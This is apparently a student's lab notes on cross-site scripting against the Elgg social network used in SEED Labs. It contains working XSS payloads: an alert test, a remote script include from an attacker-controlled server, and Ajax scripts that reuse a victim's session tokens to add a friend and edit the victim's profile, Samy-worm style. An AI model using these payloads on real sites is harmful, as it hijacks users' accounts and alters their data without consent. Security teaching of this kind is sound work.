# TD2 - XSS attacks

## code breakdown

- `<script>alert(’XSS’);</script>` : this script displays a message to the user that is the argument of alert
- if we don't have enough space for our javascript code, You host a malicious JavaScript file (e.g., myscripts.js) on a server you control.
 
    In the profile or field you want to exploit, you insert a reference to that hosted file using the script tag with the src attribute.  
    ```js
    <script type="text/javascript"src="http://www.example.com/myscript.js"></script>
    ```
- ex 3.5) 2) the sanitization mechanism used is converting special characters like > and <


```js
<script type="text/javascript">
window.onload = function () {
      var Ajax = null;
      var ts = "&elgg_ts=" + elgg.security.token.elgg_ts;
      var token = "&elgg_token=" + elgg.security.token.elgg_token;
      var sendUrl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

      Ajax = new XMLHttpRequest();

      // Error handling
      Ajax.onerror = function() {
          console.error("Request failed.");
      };

      Ajax.onload = function() {
          if (Ajax.status >= 200 && Ajax.status < 400) {
              console.log("Request was successful");
          } else {
              console.error("Server responded with an error", Ajax.status, Ajax.statusText);
          }
      };

      Ajax.open("GET", sendUrl, true);
      Ajax.send();
}
</script>
```

```js
<p><script type="text/javascript">
window.onload = function(){
    console.log("Script initialized.");

    // JavaScript code to access user name, user guid, Time Stamp elgg_ts
    // and Security Token elgg_token
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&elgg_ts=" + elgg.security.token.elgg_ts;
    var token = "&elgg_token=" + elgg.security.token.elgg_token;
    var sendurl= "http://www.seed-server.com/action/profile/edit";


    // Construct the content of your URL.
  var name = "&name=" + userName;
  var desc = "&description=haks" + "&accesslevel[description]=2";
  var content = token + ts + name + desc + guid;
  var samyGuid = 59

    if(elgg.session.user.guid != samyGuid) {
        console.log("Preparing to send the request.");
        // Create and send Ajax request to modify profile
        var Ajax = new XMLHttpRequest();

        // Listen for the response
        Ajax.onreadystatechange = function() {
            if (Ajax.readyState === 4) { // Check if request is complete
                console.log("Server Response:", Ajax.responseText);
                console.log("Status Code:", Ajax.status);
            }
        };

        // Log errors
        Ajax.onerror = function() {
            console.error("Request failed.");
        };

        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    } else {
        console.log("Script not executed for Samy.");
    }
}
</script></p>
```